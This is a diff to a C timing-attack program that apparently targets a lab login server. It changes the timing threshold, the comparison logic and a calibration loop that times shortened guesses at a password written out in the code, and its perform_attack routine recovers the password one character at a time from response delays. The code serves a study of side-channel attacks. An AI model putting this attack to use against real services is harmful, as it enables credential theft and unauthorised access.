@@ -22,10 +22,12 @@ char* ip = shan_lab_ip;
 
 #define NUM_ITERS 50
 #define NUM_CHARS 27
+
+// add A-Z, 0-9, !, @, *
 char CHARS[NUM_CHARS] = {'a','b','c','d','e','f','g','h','i',
                          'j','k','l','m','n','o','p','q','r',
                          's','t','u','v','w','x','y','z','_'};
-#define TIME_DIFFERENCE 100
+#define TIME_DIFFERENCE 50
 
 struct timespec req_before, req_after;
 const int max_expected_args = 2;
@@ -68,7 +70,7 @@ double test_creds(char* user, char* pass, int username_size, int password_size, 
     ret += 1000000000;
   }
 
-  return ret;
+  return ret / 1000;
 }
 
 char* perform_attack(int socket, char* username) {
@@ -88,7 +90,7 @@ char* perform_attack(int socket, char* username) {
         strncat(guess, &CHARS[i], 1);
         return guess;
       }
-      else if (exec_time - test > TIME_DIFFERENCE) { //?
+      else if (test - exec_time > TIME_DIFFERENCE) { //?
         exec_time = test;
         guess = current_guess;
         break;
@@ -145,91 +147,91 @@ int main(int argc, char const *argv[]) {
     password = "shannon_password_super_secret";
     test = test_creds(username, password, strlen(username), strlen(password), sock);
     if (test == -1) exit(EXIT_FAILURE);
-    test1 += (test / 1000);
+    test1 += test;
 
     //test2 (incorrect, index 26 of 28)
-    password = "shannon_password_super_seczz";
+    password = "shannon_password_super_secz";
     test = test_creds(username, password, strlen(username), strlen(password), sock);
     if (test == -1) exit(EXIT_FAILURE);
-    test2 += (test / 1000);
+    test2 += test;
 
     //test3 (incorrect, index 24 of 28)
-    password = "shannon_password_super_szzzz";
+    password = "shannon_password_super_sz";
     test = test_creds(username, password, strlen(username), strlen(password), sock);
     if (test == -1) exit(EXIT_FAILURE);
-    test3 += (test / 1000);
+    test3 += test;
 
     //test4 (incorrect, index 22 of 28)
-    password = "shannon_password_superzzzzzz";
+    password = "shannon_password_superz";
     test = test_creds(username, password, strlen(username), strlen(password), sock);
     if (test == -1) exit(EXIT_FAILURE);
-    test4 += (test / 1000);
+    test4 += test;
 
     //test5 (incorrect, index 20 of 28)
-    password = "shannon_password_supzzzzzzzz";
+    password = "shannon_password_supz";
     test = test_creds(username, password, strlen(username), strlen(password), sock);
     if (test == -1) exit(EXIT_FAILURE);
-    test5 += (test / 1000);
+    test5 += test;
 
     //test6 (incorrect, index 18 of 28)
-    password = "shannon_password_szzzzzzzzzz";
+    password = "shannon_password_sz";
     test = test_creds(username, password, strlen(username), strlen(password), sock);
     if (test == -1) exit(EXIT_FAILURE);
-    test6 += (test / 1000);
+    test6 += test;
 
     //test7 (incorrect, index 16 of 28)
-    password = "shannon_passwordzzzzzzzzzzzz";
+    password = "shannon_passwordz";
     test = test_creds(username, password, strlen(username), strlen(password), sock);
     if (test == -1) exit(EXIT_FAILURE);
-    test7 += (test / 1000);
+    test7 += test;
 
     //test8 (incorrect, index 14 of 28)
-    password = "shannon_passwozzzzzzzzzzzzzz";
+    password = "shannon_passwoz";
     test = test_creds(username, password, strlen(username), strlen(password), sock);
     if (test == -1) exit(EXIT_FAILURE);
-    test8 += (test / 1000);
+    test8 += test;
 
     //test9 (incorrect, index 12 of 28)
-    password = "shannon_passzzzzzzzzzzzzzzzz";
+    password = "shannon_passz";
     test = test_creds(username, password, strlen(username), strlen(password), sock);
     if (test == -1) exit(EXIT_FAILURE);
-    test9 += (test / 1000);
+    test9 += test;
 
     //test10 (incorrect, index 10 of 28)
-    password = "shannon_pazzzzzzzzzzzzzzzzzz";
+    password = "shannon_paz";
     test = test_creds(username, password, strlen(username), strlen(password), sock);
     if (test == -1) exit(EXIT_FAILURE);
-    test10 += (test / 1000);
+    test10 += test;
 
     //test11 (incorrect, index 8 of 28)
-    password = "shannon_zzzzzzzzzzzzzzzzzzzz";
+    password = "shannon_z";
     test = test_creds(username, password, strlen(username), strlen(password), sock);
     if (test == -1) exit(EXIT_FAILURE);
-    test11 += (test / 1000);
+    test11 += test;
 
     //test12 (incorrect, index 6 of 28)
-    password = "shannozzzzzzzzzzzzzzzzzzzzzz";
+    password = "shannoz";
     test = test_creds(username, password, strlen(username), strlen(password), sock);
     if (test == -1) exit(EXIT_FAILURE);
-    test12 += (test / 1000);
+    test12 += test;
 
     //test13 (incorrect, index 4 of 28)
-    password = "shanzzzzzzzzzzzzzzzzzzzzzzzz";
+    password = "shanz";
     test = test_creds(username, password, strlen(username), strlen(password), sock);
     if (test == -1) exit(EXIT_FAILURE);
-    test13 += (test / 1000);
+    test13 += test;
 
     //test14 (incorrect, index 2 of 28)
-    password = "shzzzzzzzzzzzzzzzzzzzzzzzzzz";
+    password = "shz";
     test = test_creds(username, password, strlen(username), strlen(password), sock);
     if (test == -1) exit(EXIT_FAILURE);
-    test14 += (test / 1000);
+    test14 += test;
 
     //test15 (incorrect, index 0 of 28)
-    password = "zzzzzzzzzzzzzzzzzzzzzzzzzzzz";
+    password = "z";
     test = test_creds(username, password, strlen(username), strlen(password), sock);
     if (test == -1) exit(EXIT_FAILURE);
-    test15 += (test / 1000);
+    test15 += test;
   }
 
   test1 = test1 / NUM_ITERS;
